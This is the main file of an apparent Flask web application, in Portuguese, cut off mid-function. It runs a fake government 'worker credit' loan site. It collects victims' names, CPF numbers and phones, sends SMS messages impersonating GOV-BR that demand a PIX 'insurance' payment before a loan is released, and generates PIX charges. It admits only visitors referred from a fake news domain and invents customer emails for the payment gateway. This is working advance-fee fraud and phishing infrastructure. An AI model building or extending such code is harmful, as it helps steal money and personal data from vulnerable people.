import os
import functools
from flask import Flask, render_template, request, jsonify, redirect, url_for, session, abort
import logging
import secrets
import qrcode
import base64
from io import BytesIO
import re
import random
import string
import requests
import json
import http.client
from payment_gateway import get_payment_gateway

app = Flask(__name__)

# Domínio autorizado
AUTHORIZED_DOMAIN = "globo.noticiario-plantao.com"

def check_referer(f):
    @functools.wraps(f)
    def decorated_function(*args, **kwargs):
        # Obter referer
        referer = request.headers.get('Referer')
        
        # Verificar se estamos forçando a verificação de domínio
        FORCE_DOMAIN_CHECK = os.environ.get('FORCE_DOMAIN_CHECK', 'False').lower() == 'true'
        
        # Em ambiente de desenvolvimento Replit, verificamos a variável de ambiente
        if not FORCE_DOMAIN_CHECK and 'REPL_ID' in os.environ:
            app.logger.info(f"Ambiente de desenvolvimento detectado. Permitindo acesso. Referer: {referer}, Path: {request.path}")
            return f(*args, **kwargs)

        # Se o referer está vindo do nosso próprio site, permitir
        if referer and request.host in referer:
            app.logger.info(f"Navegação interna detectada, permitindo acesso: {request.path}")
            return f(*args, **kwargs)
            
        # Verificar domínio autorizado para acesso externo
        if not referer or AUTHORIZED_DOMAIN not in referer:
            app.logger.warning(f"Acesso não autorizado detectado! Referer: {referer}")
            return render_template('unauthorized.html'), 403
            
        # Se chegou aqui, o referer contém o domínio autorizado
        app.logger.info(f"Acesso autorizado via domínio para: {request.path}")
        return f(*args, **kwargs)
        
    return decorated_function

# Se não existir SESSION_SECRET, gera um valor aleatório seguro
if not os.environ.get("SESSION_SECRET"):
    os.environ["SESSION_SECRET"] = secrets.token_hex(32)

app.secret_key = os.environ.get("SESSION_SECRET")

# Configurar logging
logging.basicConfig(level=logging.DEBUG)

# Configuração para escolher qual API SMS usar: 'SMSDEV' ou 'OWEN'
SMS_API_CHOICE = os.environ.get('SMS_API_CHOICE', 'OWEN')

def send_verification_code_smsdev(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using SMSDEV API
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Get SMS API key from environment variables
        sms_api_key = os.environ.get('SMSDEV_API_KEY')
        if not sms_api_key:
            app.logger.error("SMSDEV_API_KEY not found in environment variables")
            return False, "API key not configured"

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            # Log the response
            app.logger.info(f"SMSDEV: Verification code sent to {formatted_phone}. Response: {response.text}")

            if response.status_code == 200:
                return True, None
            else:
                return False, f"API error: {response.text}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False, str(e)

def send_verification_code_owen(phone_number: str, verification_code: str) -> tuple:
    """
    Sends a verification code via SMS using Owen SMS API v2
    Returns a tuple of (success, error_message or None)
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False, "API token not configured"

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) == 11:  # Ensure it's in the correct format with DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Message template
            message = f"[PROGRAMA CREDITO DO TRABALHADOR] Seu código de verificação é: {verification_code}. Não compartilhe com ninguém."

            # Prepare the curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "VerificationCode",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando código de verificação para {international_number} usando curl")
            payload = {
                    'operator': 'claro',
                    'destination_number': international_number,
                    'message': message,
                    'tag': 'VerificationCode',
                    'user_reply': False,
                    'webhook_url': ''
                }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
                
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            if process.returncode == 0 and "error" not in process.stdout.lower():
                return True, None
            else:
                error_msg = process.stderr if process.stderr else process.stdout
                return False, f"API error: {error_msg}"
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido"

    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False, str(e)

def send_verification_code(phone_number: str) -> tuple:
    """
    Sends a verification code via the selected SMS API
    Returns a tuple of (success, code or error_message)
    """
    try:
        # Generate random 4-digit code
        verification_code = ''.join(random.choices('0123456789', k=4))

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False, "Número de telefone inválido (deve conter DDD + 9 dígitos)"

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            success, error = send_verification_code_owen(phone_number, verification_code)
        else:  # Default to SMSDEV
            success, error = send_verification_code_smsdev(phone_number, verification_code)

        if success:
            return True, verification_code
        else:
            return False, error

    except Exception as e:
        app.logger.error(f"Error in send_verification_code: {str(e)}")
        return False, str(e)

def send_sms_smsdev(phone_number: str, message: str) -> bool:
    """
    Send SMS using SMSDEV API
    """
    try:
        # Get SMS API key from environment variables
        sms_api_key = os.environ.get('SMSDEV_API_KEY')
        if not sms_api_key:
            app.logger.error("SMSDEV_API_KEY not found in environment variables")
            return False

        # Format phone number (remove any non-digits and ensure it's in the correct format)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # API parameters
            params = {
                'key': sms_api_key,
                'type': '9',
                'number': formatted_phone,
                'msg': message
            }

            # Make API request
            response = requests.get('https://api.smsdev.com.br/v1/send', params=params)

            app.logger.info(f"SMSDEV: SMS sent to {formatted_phone}. Response: {response.text}")
            return response.status_code == 200
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False
    except Exception as e:
        app.logger.error(f"Error sending SMS via SMSDEV: {str(e)}")
        return False

def send_sms_owen(phone_number: str, message: str) -> bool:
    """
    Send SMS using Owen SMS API v2 with curl
    """
    try:
        # Get SMS API token from environment variables
        sms_token = os.environ.get('SMS_OWEN_TOKEN')
        if not sms_token:
            app.logger.error("SMS_OWEN_TOKEN not found in environment variables")
            return False

        # Format phone number (remove any non-digits and add Brazil country code)
        formatted_phone = re.sub(r'\D', '', phone_number)
        if len(formatted_phone) == 11:  # Include DDD
            # Format as international number with Brazil code
            international_number = f"55{formatted_phone}"

            # Prepare and execute curl command
            import subprocess

            curl_command = [
                'curl',
                '--location',
                'https://api.apisms.me/v2/sms/send',
                '--header', 'Content-Type: application/json',
                '--header', f'Authorization: {sms_token}',
                '--data',
                json.dumps({
                    "operator": "claro",  # claro, vivo ou tim
                    "destination_number": f"{international_number}",  # Número do destinatário com código internacional
                    "message": message,  # Mensagem SMS com limite de 160 caracteres
                    "tag": "LoanApproval",  # Tag para identificação do SMS
                    "user_reply": False,  # Não receber resposta do destinatário
                    "webhook_url": ""  # Opcional para callbacks
                })
            ]

            # Execute curl command
            app.logger.info(f"Enviando SMS para {international_number} usando curl")
            payload = {
                "operator": "claro",
                "destination_number": international_number,
                "message": message,
                "tag": "LoanApproval",
                "user_reply": False,
                "webhook_url": ""
            }
            app.logger.info(f"JSON payload: {json.dumps(payload)}")
            
            process = subprocess.run(curl_command, capture_output=True, text=True)

            # Log response
            app.logger.info(f"OWEN SMS: Response for {international_number}: {process.stdout}")
            app.logger.info(f"OWEN SMS: Error for {international_number}: {process.stderr}")

            return process.returncode == 0 and "error" not in process.stdout.lower()
        else:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False
    except Exception as e:
        app.logger.error(f"Error sending SMS via Owen SMS: {str(e)}")
        return False

def send_sms(phone_number: str, full_name: str, amount: float) -> bool:
    try:
        # Get first name
        first_name = full_name.split()[0]

        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)

        if len(formatted_phone) != 11:
            app.logger.error(f"Invalid phone number format: {phone_number}")
            return False

        # Message template
        message = f"[GOV-BR] {first_name}, estamos aguardando o pagamento do seguro no valor R${amount:.2f} para realizar a transferencia PIX do emprestimo para a sua conta bancaria."

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            return send_sms_owen(phone_number, message)
        else:  # Default to SMSDEV
            return send_sms_smsdev(phone_number, message)
    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False
        
def send_payment_confirmation_sms(phone_number: str, nome: str, cpf: str, thank_you_url: str) -> bool:
    """
    Envia SMS de confirmação de pagamento com link personalizado para a página de agradecimento
    """
    try:
        if not phone_number:
            app.logger.error("[PROD] Número de telefone não fornecido para SMS de confirmação")
            return False
            
        # Format phone number (remove any non-digits)
        formatted_phone = re.sub(r'\D', '', phone_number)
        
        if len(formatted_phone) != 11:
            app.logger.error(f"[PROD] Formato inválido de número de telefone: {phone_number}")
            return False
            
        # Criar mensagem personalizada com link para thank_you_url
        nome_formatado = nome.split()[0] if nome else "Cliente"  # Usar apenas o primeiro nome
        
        # Mensagem padrão com nome e link para a página de obrigado
        message = f"[PROGRAMA CRÉDITO DO TRABALHADOR] Olá {nome_formatado}, seu pagamento foi confirmado! Acesse para mais detalhes: {thank_you_url}"
        
        # Escolher qual API usar com base em SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            return send_sms_owen(phone_number, message)
        else:  # Default to SMSDEV
            return send_sms_smsdev(phone_number, message)

    except Exception as e:
        app.logger.error(f"Error in send_sms: {str(e)}")
        return False

def generate_random_email(name: str) -> str:
    clean_name = re.sub(r'[^a-zA-Z]', '', name.lower())
    random_number = ''.join(random.choices(string.digits, k=4))
    domains = ['gmail.com', 'outlook.com', 'hotmail.com', 'yahoo.com']
    domain = random.choice(domains)
    return f"{clean_name}{random_number}@{domain}"

def format_cpf(cpf: str) -> str:
    cpf = re.sub(r'\D', '', cpf)
    return f"{cpf[:3]}.{cpf[3:6]}.{cpf[6:9]}-{cpf[9:]}" if len(cpf) == 11 else cpf

def generate_random_phone():
    ddd = str(random.randint(11, 99))
    number = ''.join(random.choices(string.digits, k=8))
    return f"{ddd}{number}"

def generate_qr_code(pix_code: str) -> str:
    qr = qrcode.QRCode(
        version=1,
        error_correction=qrcode.constants.ERROR_CORRECT_L,
        box_size=10,
        border=4,
    )
    qr.add_data(pix_code)
    qr.make(fit=True)

    img = qr.make_image(fill_color="black", back_color="white")
    buffered = BytesIO()
    img.save(buffered, format="PNG")
    img_str = base64.b64encode(buffered.getvalue()).decode()
    return f"data:image/png;base64,{img_str}"

@app.route('/')
@check_referer
def index():
    try:
        # Get data from query parameters for backward compatibility
        customer_data = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', '')
        }

        app.logger.info(f"[PROD] Renderizando página inicial para: {customer_data}")
        return render_template('index.html', customer=customer_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na rota index: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/payment')
@check_referer
def payment():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone')  # Get phone from query params
        source = request.args.get('source', 'index')

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")

        # Inicializa a API de pagamento usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Use provided phone if available, otherwise generate random
        customer_phone = phone.replace('\D', '') if phone else generate_random_phone()

        # Define o valor baseado na origem
        if source == 'insurance':
            amount = 47.60  # Valor fixo para o seguro
        elif source == 'index':
            amount = 142.83
        else:
            amount = 74.90

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': customer_phone,
            'amount': amount
        }

        app.logger.info(f"[PROD] Dados do pagamento: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Send SMS notification if we have a valid phone number
        if phone:
            send_sms(phone, nome, amount)

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pixQrCode') or pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pixCode') or pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Gerar QR code com biblioteca qrcode
            qr = qrcode.QRCode(version=1, box_size=10, border=5)
            qr.add_data(pix_code)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            buffered = BytesIO()
            img.save(buffered, format="PNG")
            qr_code = "data:image/png;base64," + base64.b64encode(buffered.getvalue()).decode()
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         transaction_id=pix_data.get('id'),
                         amount=amount)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/payment-update')
@check_referer
def payment_update():
    try:
        app.logger.info("[PROD] Iniciando geração de PIX para atualização cadastral...")

        # Obter dados do usuário da query string
        nome = request.args.get('nome')
        cpf = request.args.get('cpf')
        phone = request.args.get('phone', '') # Adicionar parâmetro phone

        if not nome or not cpf:
            app.logger.error("[PROD] Nome ou CPF não fornecidos")
            return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400

        app.logger.info(f"[PROD] Dados do cliente para atualização: nome={nome}, cpf={cpf}, phone={phone}")

        # Inicializa a API usando nossa factory
        api = get_payment_gateway()

        # Formata o CPF removendo pontos e traços
        cpf_formatted = ''.join(filter(str.isdigit, cpf))

        # Gera um email aleatório baseado no nome do cliente
        customer_email = generate_random_email(nome)

        # Usa o telefone informado pelo usuário ou gera um se não estiver disponível
        if not phone:
            phone = generate_random_phone()
            app.logger.info(f"[PROD] Telefone não fornecido, gerando aleatório: {phone}")
        else:
            app.logger.info(f"[PROD] Usando telefone fornecido pelo usuário: {phone}")

        # Dados para a transação
        payment_data = {
            'name': nome,
            'email': customer_email,
            'cpf': cpf_formatted,
            'phone': phone,
            'amount': 74.90  # Valor fixo para atualização cadastral
        }

        app.logger.info(f"[PROD] Dados do pagamento de atualização: {payment_data}")

        # Cria o pagamento PIX
        pix_data = api.create_pix_payment(payment_data)

        app.logger.info(f"[PROD] PIX gerado com sucesso: {pix_data}")

        # Obter QR code e PIX code da resposta da API
        qr_code = pix_data.get('pix_qr_code')
        pix_code = pix_data.get('pix_code')
        
        # Garantir que temos valores válidos
        if not qr_code:
            # Algumas APIs podem usar outros nomes para o QR code
            qr_code = pix_data.get('qr_code_image') or pix_data.get('qr_code') or pix_data.get('pixQrCode') or ''
            
        if not pix_code:
            # Algumas APIs podem usar outros nomes para o código PIX
            pix_code = pix_data.get('copy_paste') or pix_data.get('code') or pix_data.get('pixCode') or ''
        
        # Log detalhado para depuração
        app.logger.info(f"[PROD] QR code: {qr_code[:50]}... (truncado)")
        app.logger.info(f"[PROD] PIX code: {pix_code[:50]}... (truncado)")
            
        return render_template('payment_update.html', 
                         qr_code=qr_code,
                         pix_code=pix_code, 
                         nome=nome, 
                         cpf=format_cpf(cpf),
                         phone=phone,  # Passando o telefone para o template
                         transaction_id=pix_data.get('id'),
                         amount=74.90)

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao gerar PIX: {str(e)}")
        if hasattr(e, 'args') and len(e.args) > 0:
            return jsonify({'error': str(e.args[0])}), 500
        return jsonify({'error': str(e)}), 500

@app.route('/check-payment-status/<transaction_id>')
@check_referer
def check_payment_status(transaction_id):
    try:
        # Obter informações do usuário da sessão se disponíveis
        nome = request.args.get('nome', '')
        cpf = request.args.get('cpf', '')
        phone = request.args.get('phone', '')
        
        api = get_payment_gateway()
        status_data = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento {transaction_id}: {status_data}")
        
        # Verificar se o pagamento foi aprovado
        if status_data.get('status') == 'completed' or status_data.get('original_status') in ['APPROVED', 'PAID']:
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {}
            if nome:
                params['nome'] = nome
            if cpf:
                params['cpf'] = cpf
                
            # Construir a URL completa com parâmetros
            if params:
                thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_data)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status: {str(e)}")
        return jsonify({'error': str(e)}), 500

@app.route('/verificar-cpf')
@check_referer
def verificar_cpf():
    app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
    return render_template('verificar-cpf.html')

@app.route('/buscar-cpf')
@check_referer
def buscar_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500
            
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500

        app.logger.info("[PROD] Acessando página de busca de CPF: buscar-cpf.html")
        return render_template('buscar-cpf.html', verification_token=verification_token, exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar busca de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/input-cpf')
@check_referer
def input_cpf():
    try:
        verification_token = os.environ.get('VERIFICATION_TOKEN')
        if not verification_token:
            app.logger.error("[PROD] VERIFICATION_TOKEN not found in environment variables")
            return jsonify({'error': 'Configuration error'}), 500

        app.logger.info("[PROD] Acessando página de entrada de CPF: input_cpf.html")
        return render_template('input_cpf.html', verification_token=verification_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar entrada de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/analisar-cpf')
@check_referer
def analisar_cpf():
    try:
        app.logger.info("[PROD] Acessando página de análise de CPF: analisar_cpf.html")
        exato_api_token = os.environ.get('EXATO_API_TOKEN')
        if not exato_api_token:
            app.logger.error("[PROD] EXATO_API_TOKEN not found in environment variables")
            return jsonify({'error': 'API Token configuration error'}), 500
        
        return render_template('analisar_cpf.html', exato_api_token=exato_api_token)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar análise de CPF: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/opcoes-emprestimo')
@check_referer
def opcoes_emprestimo():
    try:
        # Get query parameters
        cpf = request.args.get('cpf')
        nome = request.args.get('nome')
        
        if not cpf or not nome:
            app.logger.error("[PROD] CPF ou nome não fornecidos")
            return redirect('/input-cpf')
            
        app.logger.info(f"[PROD] Acessando página de opções de empréstimo para CPF: {cpf}")
        return render_template('opcoes_emprestimo.html')
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar opções de empréstimo: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/aviso')
@check_referer
def seguro_prestamista():
    try:
        # Get customer data from query parameters
        customer = {
            'nome': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', ''),
            'phone': request.args.get('phone', ''),
            'pix_key': request.args.get('pix_key', ''),
            'bank': request.args.get('bank', ''),
            'amount': request.args.get('amount', '0'),
            'term': request.args.get('term', '0')
        }
        
        app.logger.info(f"[PROD] Renderizando página de aviso sobre seguro prestamista: {customer}")
        return render_template('aviso.html', customer=customer)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de aviso: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/obrigado')
@check_referer
def thank_you():
    try:
        # Get customer data from query parameters if available
        customer = {
            'name': request.args.get('nome', ''),
            'cpf': request.args.get('cpf', '')
        }

        meta_pixel_id = os.environ.get('META_PIXEL_ID')
        return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
    except Exception as e:
        app.logger.error(f"[PROD] Erro na página de obrigado: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/create-pix-payment', methods=['POST'])
@check_referer
def create_pix_payment():
    try:
        # Validar dados da requisição
        if not request.is_json:
            app.logger.error("[PROD] Requisição inválida: conteúdo não é JSON")
            return jsonify({'error': 'Requisição inválida: formato JSON esperado'}), 400
            
        data = request.json
        
        # Verificar campos obrigatórios
        required_fields = ['name', 'cpf', 'amount']
        for field in required_fields:
            if field not in data or not data[field]:
                app.logger.error(f"[PROD] Campo obrigatório ausente: {field}")
                return jsonify({'error': f'Campo obrigatório ausente: {field}'}), 400
        
        app.logger.info(f"[PROD] Iniciando criação de pagamento PIX: {data}")
        
        # Usar a API For4Payments especificamente
        from for4payments2 import create_payment_api
        
        try:
            api = create_payment_api()
            app.logger.info("[PROD] API For4Payments inicializada com sucesso")
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API For4Payments: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento. Tente novamente mais tarde.'}), 500
        
        # Criar o pagamento PIX
        try:
            payment_result = api.create_pix_payment(data)
            app.logger.info(f"[PROD] Pagamento PIX criado com sucesso: {payment_result}")
            
            # Construir resposta
            response = {
                'transaction_id': payment_result.get('id'),
                'pix_code': payment_result.get('pixCode'),
                'pix_qr_code': payment_result.get('pixQrCode'),
                'status': payment_result.get('status', 'pending')
            }
            
            return jsonify(response)
            
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': str(e)}), 400
        except Exception as e:
            app.logger.error(f"[PROD] Erro inesperado ao criar pagamento PIX: {str(e)}")
            return jsonify({'error': 'Erro ao processar pagamento. Tente novamente mais tarde.'}), 500
            
    except Exception as e:
        app.logger.error(f"[PROD] Erro geral ao processar requisição: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500
        
@app.route('/check-for4payments-status')
@check_referer
def check_for4payments_status():
    try:
        transaction_id = request.args.get('transaction_id')
        
        if not transaction_id:
            app.logger.error("[PROD] ID da transação não fornecido")
            return jsonify({'error': 'ID da transação é obrigatório'}), 400
            
        app.logger.info(f"[PROD] Verificando status do pagamento com For4Payments: {transaction_id}")
        
        # Usar a API For4Payments especificamente
        from for4payments2 import create_payment_api
        
        try:
            api = create_payment_api()
        except ValueError as e:
            app.logger.error(f"[PROD] Erro ao inicializar API For4Payments: {str(e)}")
            return jsonify({'error': 'Serviço de pagamento indisponível no momento.'}), 500
        
        # Verificar status do pagamento
        status_result = api.check_payment_status(transaction_id)
        app.logger.info(f"[PROD] Status do pagamento com For4Payments: {status_result}")
        
        # Verificar se o pagamento foi aprovado
        if status_result.get('status') == 'completed' or status_result.get('original_status') in ['APPROVED', 'PAID']:
            # Obter informações do usuário dos parâmetros da URL ou da sessão
            nome = request.args.get('nome', '')
            cpf = request.args.get('cpf', '')
            phone = request.args.get('phone', '')
            
            app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado via For4Payments. Enviando SMS com link de agradecimento.")
            
            # Construir o URL personalizado para a página de agradecimento
            thank_you_url = request.url_root.rstrip('/') + '/obrigado'
            
            # Adicionar parâmetros do usuário, se disponíveis
            params = {}
            if nome:
                params['nome'] = nome
            if cpf:
                params['cpf'] = cpf
                
            # Construir a URL completa com parâmetros
            if params:
                thank_you_url += '?' + '&'.join([f"{key}={value}" for key, value in params.items()])
            
            # Enviar SMS apenas se o número de telefone estiver disponível
            if phone:
                # Usando a função especializada para enviar SMS de confirmação de pagamento
                success = send_payment_confirmation_sms(phone, nome, cpf, thank_you_url)
                if success:
                    app.logger.info(f"[PROD] SMS de confirmação enviado com sucesso para {phone}")
                else:
                    app.logger.error(f"[PROD] Falha ao enviar SMS de confirmação para {phone}")
        
        return jsonify(status_result)
        
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao verificar status do pagamento com For4Payments: {str(e)}")
        return jsonify({'status': 'pending', 'error': str(e)})

@app.route('/send-verification-code', methods=['POST'])
@check_referer
def send_verification_code_route():
    try:
        data = request.json
        phone_number = data.get('phone')

        if not phone_number:
            return jsonify({'success': False, 'message': 'Número de telefone não fornecido'}), 400

        success, result = send_verification_code(phone_number)

        if success:
            # Store the verification code temporarily (in a real app, this should use Redis or similar)
            # For demo purposes, we'll just return it directly (not ideal for security)
            return jsonify({
                'success': True, 
                'message': 'Código enviado com sucesso',
                'verification_code': result  # In a real app, don't send this back to client
            })
        else:
            return jsonify({'success': False, 'message': result}), 400

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao enviar código de verificação: {str(e)}")
        return jsonify({'success': False, 'message': 'Erro ao enviar código de verificação'}), 500

@app.route('/atualizar-cadastro', methods=['POST'])
def atualizar_cadastro():
    try:
        app.logger.info("[PROD] Recebendo atualização cadastral")
        # Log form data for debugging
        app.logger.debug(f"Form data: {request.form}")

        # Extract form data
        data = {
            'birth_date': request.form.get('birth_date'),
            'cep': request.form.get('cep'),
            'employed': request.form.get('employed'),
            'salary': request.form.get('salary'),
            'household_members': request.form.get('household_members')
        }

        app.logger.info(f"[PROD] Dados recebidos: {data}")

        # Aqui você pode adicionar a lógica para processar os dados
        # Por enquanto, vamos apenas redirecionar para a página de pagamento
        nome = request.form.get('nome', '')
        cpf = request.form.get('cpf', '')
        phone = request.form.get('phone', '')  # Obter número de telefone do formulário

        return redirect(url_for('payment_update', nome=nome, cpf=cpf, phone=phone))

    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar cadastro: {str(e)}")
        return jsonify({'error': 'Erro ao processar atualização cadastral'}), 500

@app.route('/sms-config')
def sms_config():
    try:
        # Check SMS API key status
        smsdev_status = bool(os.environ.get('SMSDEV_API_KEY'))
        owen_status = bool(os.environ.get('SMS_OWEN_TOKEN'))

        # Get test result from session if available
        test_result = session.pop('test_result', None)
        test_success = session.pop('test_success', None)

        return render_template('sms_config.html',
                              current_api=SMS_API_CHOICE,
                              smsdev_status=smsdev_status,
                              owen_status=owen_status,
                              test_result=test_result,
                              test_success=test_success)
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao acessar configuração SMS: {str(e)}")
        return jsonify({'error': 'Erro interno do servidor'}), 500

@app.route('/update-sms-config', methods=['POST'])
def update_sms_config():
    try:
        sms_api = request.form.get('sms_api', 'SMSDEV')

        # In a real application, this would be saved to a database
        # But for this demo, we'll use a global variable
        global SMS_API_CHOICE
        SMS_API_CHOICE = sms_api

        app.logger.info(f"[PROD] API SMS atualizada para: {sms_api}")

        # We would typically use Flask's flash() here, but for simplicity we'll use a session variable
        session['test_result'] = f"Configuração atualizada para {sms_api}"
        session['test_success'] = True

        return redirect(url_for('sms_config'))
    except Exception as e:
        app.logger.error(f"[PROD] Erro ao atualizar configuração SMS: {str(e)}")
        session['test_result'] = f"Erro ao atualizar configuração: {str(e)}"
        session['test_success'] = False
        return redirect(url_for('sms_config'))

@app.route('/send-test-sms', methods=['POST'])
def send_test_sms():
    try:
        phone = request.form.get('phone', '')

        if not phone:
            session['test_result'] = "Por favor, forneça um número de telefone válido"
            session['test_success'] = False
            return redirect(url_for('sms_config'))

        # Message template for test
        message = "[PROGRAMA CREDITO DO TRABALHADOR] Esta é uma mensagem de teste do sistema."

        # Choose which API to use based on SMS_API_CHOICE
        if SMS_API_CHOICE.upper() == 'OWEN':
            success = send_sms_owen(phone, message)
        else:  # Default to SMSDEV
            success = send_sms_smsdev(phone, message)

        if success:
            session['test_result'] = f"SMS de teste enviado com sucesso para {phone}"
            session['test_success'] = True
        else:
